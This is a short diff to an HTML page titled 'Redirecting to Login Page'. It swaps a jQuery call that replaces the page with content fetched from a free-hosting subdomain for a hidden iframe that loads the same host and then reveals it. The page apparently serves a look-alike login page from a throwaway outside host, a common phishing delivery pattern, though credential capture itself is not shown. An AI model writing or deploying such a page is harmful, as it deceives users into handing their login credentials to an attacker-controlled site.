@@ -2,17 +2,15 @@
 <html>
 <head>
     <title>Redirecting to Login Page</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script>
-        $(document).ready(function() {
-            // Load login page content using AJAX
-            $.get("https://duskiest-piers.000webhostapp.com", function(data) {
-                // Replace the current page content with the login page content
-                $("html").html(data);
-            });
-        });
-    </script>
 </head>
 <body>
+    <iframe id="loginFrame" src="https://duskiest-piers.000webhostapp.com" style="display:none;"></iframe>
+    <script>
+        // Wait for the iframe content to load
+        window.onload = function() {
+            // Show the iframe after the content is loaded
+            document.getElementById('loginFrame').style.display = 'block';
+        };
+    </script>
 </body>
 </html>
